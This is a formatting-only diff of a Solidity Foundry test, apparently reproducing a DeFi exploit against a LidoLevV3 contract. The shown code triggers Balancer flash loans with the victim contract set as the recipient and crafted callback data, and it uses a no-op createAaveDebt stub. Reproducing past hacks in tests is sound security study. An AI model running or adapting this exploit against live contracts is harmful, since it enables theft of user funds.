@@ -15,7 +15,12 @@ import "./../interface.sol";
 */
 
 interface IBalancer {
-    function flashLoan(IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
+    function flashLoan(
+        IFlashLoanRecipient recipient,
+        IERC20[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
 }
 
 contract ExploitTest is Test {
@@ -23,7 +28,7 @@ contract ExploitTest is Test {
     address Balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
     address LidoLevV3 = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
     address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
-    
+
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
@@ -40,7 +45,6 @@ contract ExploitTest is Test {
             IERC20(aEthwstETH).decimals()
         );
 
-
         bytes memory userencodeData = abi.encode(1, address(this));
         bytes memory userencodeData2 = abi.encode(2, address(this));
         uint256[] memory amount = new uint256[](1);
@@ -48,7 +52,7 @@ contract ExploitTest is Test {
         IERC20[] memory token = new IERC20[](1);
 
         token[0] = IERC20(WETH);
-        amount[0] = 318973831042619036856;
+        amount[0] = 318_973_831_042_619_036_856;
         amount2[0] = 0;
         IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount, userencodeData);
         IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount2, userencodeData2);
@@ -60,7 +64,9 @@ contract ExploitTest is Test {
         );
     }
 
-    function createAaveDebt(uint256 wethAmount) external {
+    function createAaveDebt(
+        uint256 wethAmount
+    ) external {
         // do nothing
     }
 }
